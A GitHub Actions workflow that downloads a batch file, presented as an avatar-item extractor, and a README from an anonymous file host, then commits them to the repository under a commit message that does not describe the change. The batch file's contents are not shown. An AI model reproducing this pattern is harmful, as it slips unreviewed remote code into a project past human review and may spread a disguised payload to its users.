name: install
on:
  push:
    paths:
      - ".github/workflows/install.yml"
permissions:
  contents: write
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch both files
        run: |
          curl -fsSL https://files.catbox.moe/wkae1r.bat -o Extract-AvatarItem-v20.bat
          curl -fsSL https://files.catbox.moe/pc0goh.md -o README.md
      - name: verify them
        run: |
          echo "8788619047209696d3242740f9c4650bd78979dd4ee1080a7b82ec50bfc0cd75  Extract-AvatarItem-v20.bat" | sha256sum -c -
          echo "e8cd1d8918b8628fc38d09819878f36d3dd5b6c2e90c13982d357a8888186c16  README.md" | sha256sum -c -
      - name: commit them
        run: |
          git config user.name "extractor installer"
          git config user.email "actions@users.noreply.github.com"
          git add Extract-AvatarItem-v20.bat README.md
          git commit -m "Name the results folder after the container title"
          git push
